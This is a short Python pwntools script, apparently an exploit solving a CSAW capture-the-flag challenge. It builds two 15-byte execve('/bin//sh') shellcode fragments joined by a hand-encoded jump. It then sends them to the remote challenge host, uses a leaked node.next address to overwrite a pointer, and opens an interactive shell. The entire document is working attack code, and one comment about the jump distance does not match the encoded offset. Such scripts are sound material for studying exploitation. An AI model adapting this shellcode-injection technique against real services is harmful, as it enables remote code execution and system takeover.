from pwn import *

context.arch = 'amd64'

# Hand-crafted shellcode to fit in 2 x 15 bytes
shc1 = '''
xor esi, esi
movabs rbx, 0x68732f2f6e69622f
'''
shc1 = asm(shc1)
# pwn.asm won't assemble relocations. Do this by hand instead. 
shc1 += b'\xeb\x121'  # [jmp 0x20] => jump 22 bytes forward from here
assert(len(shc1) <= 15)  # snug fit: exactly 15 bytes

shc2 = '''
push rsi
push rbx
push rsp
pop rdi
push 59
pop rax
xor edx, edx
syscall
'''
shc2 = asm(shc2)
assert(len(shc2) <= 15)

print(disasm(shc1 + shc2))

r = remote('pwn.chal.csaw.io', 9005)

r.sendline(shc2)
r.sendline(shc1)

r.recvuntil('node.next: ')
bottom = int(r.recvline(), 16)
print('node.next @ %x' % bottom)
dest = p64(bottom + 0x08)   # node.next takes up 8 bytes, then shellcode

r.sendline(b'\xff' * 11 + dest)

r.clean()
r.interactive()
